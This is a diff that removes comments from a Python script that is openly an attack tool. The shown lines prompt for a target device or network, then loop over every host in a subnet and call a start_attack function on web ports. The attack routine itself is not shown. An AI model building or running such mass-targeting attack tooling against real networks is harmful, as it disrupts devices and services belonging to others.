@@ -59,11 +59,11 @@ def start_attack(target_ip, target_port):
 
 def attack_network(network_ip, target_port):
     net = ipaddress.IPv4Network(network_ip, strict=False)
-    for ip in net.hosts():  # Identify the devices within the network
+    for ip in net.hosts():  
         print(f"Attacking {ip}...")
         start_attack(str(ip), target_port)
 
-# Function to validate IP address format
+
 def is_valid_ip(ip):
     try:
         socket.inet_aton(ip)
@@ -71,11 +71,11 @@ def is_valid_ip(ip):
     except socket.error:
         return False
 
-# Function to check if the IP address contains exactly 3 dots
+
 def contains_three_dots(ip):
     return ip.count('.') == 3
 
-# Main function to take user input and perform the attack
+
 if __name__ == "__main__":
     print("\033[1;34mChoose the type of attack:\033[0m\n")
     print("\033[0;32m1 - Attack a specific device in the network\033[0m\n")
@@ -89,7 +89,7 @@ if __name__ == "__main__":
         target_ip = input("\033[0;36mEnter the target device IP address: \033[0m").strip()
         target_port = input("\033[0;36mEnter the target port (usually 80 or 443): \033[0m").strip()
 
-        # Check if the IP and port are empty or invalid
+        
         if not target_ip:
             print("\033[1;31mError: You must enter the mobile device IP address.\033[0m")
         elif not target_port:
